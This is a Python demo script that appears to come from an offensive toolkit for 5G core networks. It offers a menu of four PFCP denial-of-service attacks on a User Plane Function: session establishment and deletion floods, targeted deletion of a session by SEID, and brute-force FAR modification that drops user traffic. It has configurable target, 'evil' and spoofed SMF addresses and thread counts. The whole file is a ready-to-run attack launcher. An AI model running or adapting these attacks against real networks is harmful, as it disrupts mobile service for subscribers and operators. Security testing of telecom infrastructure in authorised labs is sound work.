from upf_pfcp.pfcpDosAttack import PFCPDosAttack

EVIL_ADDR = "10.100.200.66" 
UPF_ADDR  = "10.100.200.2"
SPOOFED_SMF_ADDR = "10.100.200.8"
DEST_PORT = 8805
SRC_PORT = 8805
NET_IFACE= "eth0"


def main():
    
    print("PFCPToolkit and PFCPDosAttack demo script")
    print("Coded with <3 by nxvertime")
    print("---------------------------------------\n")
    
    print("Choose an attack : ")
    print("[1]  PFCP Session Establishment Flood")
    print("[2]  PFCP Session Deletion Flood")
    print("[3]  PFCP Session Deletion Targeted")
    print("[4]  PFCP Session Modification FAR Drop")
    
    usr_input = input("# ")
    choice = None
    try:
        choice = int(usr_input)
    except ValueError:
        print("Invalid input. Please enter a number.")
        return
    
    if choice == 1:
        print("PFCP Session Establishment Flood selected")
        
        print(f"Enter your IP address (evil_addr) [default: {EVIL_ADDR}]: ")
        evil_addr = input("# ") or EVIL_ADDR
        print(f"Enter the UPF address (upf_addr) [default: {UPF_ADDR}]: ")
        upf_addr = input("# ") or UPF_ADDR
        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
        src_port = int(input("# ") or SRC_PORT)
        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
        dest_port = int(input("# ") or DEST_PORT)
        
        print("Number of requests: ")
        reqNbr = int(input("# "))
        print("Number of threads: ")
        num_threads = int(input("# "))
        print("Random FAR number (0 to disable): ")
        random_far_number = int(input("# "))
        
        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
        dos_obj.set_random_far_number(random_far_number)

        dos_obj.Start_pfcp_session_establishment_flood(reqNbr=reqNbr, num_threads=num_threads)
        
    if choice == 2:
        print("PFCP Session Deletion Flood selected")
        
        print(f"Enter your IP address (evil_addr) [default: {EVIL_ADDR}]: ")
        evil_addr = input("# ") or EVIL_ADDR
        print(f"Enter the UPF address (upf_addr) [default: {UPF_ADDR}]: ")
        upf_addr = input("# ") or UPF_ADDR
        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
        src_port = int(input("# ") or SRC_PORT)
        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
        dest_port = int(input("# ") or DEST_PORT)
        
        print("Number of requests: ")
        reqNbr = int(input("# "))
        print("Number of threads: ")
        num_threads = int(input("# "))
        
        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
        dos_obj.Start_pfcp_session_deletion_bruteforce(reqNbr=reqNbr, num_threads=num_threads)

    if choice == 3:
        print("PFCP Session Deletion Targeted selected")
        
        print(f"Enter your IP address (evil_addr) [default: {EVIL_ADDR}]: ")
        evil_addr = input("# ") or EVIL_ADDR
        print(f"Enter the UPF address (upf_addr) [default: {UPF_ADDR}]: ")
        upf_addr = input("# ") or UPF_ADDR
        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
        src_port = int(input("# ") or SRC_PORT)
        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
        dest_port = int(input("# ") or DEST_PORT)
        
        print("SEID to delete (in hex): ")
        target_seid = int(input("# "), 0)
        
        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
        dos_obj.Start_pfcp_session_deletion_targeted(target_seid=target_seid, smf_addr=evil_addr)
    
    if choice == 4:
        print("PFCP Session Modification FAR Drop selected")
        
        print(f"Enter your IP address (evil_addr) [default: {EVIL_ADDR}]: ")
        evil_addr = input("# ") or EVIL_ADDR
        print(f"Enter the UPF address (upf_addr) [default: {UPF_ADDR}]: ")
        upf_addr = input("# ") or UPF_ADDR
        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
        src_port = int(input("# ") or SRC_PORT)
        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
        dest_port = int(input("# ") or DEST_PORT)
        
        print("Enter the FAR range: ")
        far_range = int(input("# "))
        print("Enter the Session range: ")
        session_range = int(input("# "))
        
        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
        dos_obj.Start_pfcp_session_modification_far_drop_bruteforce(far_range=far_range, session_range=session_range)


if __name__ == "__main__":
    main()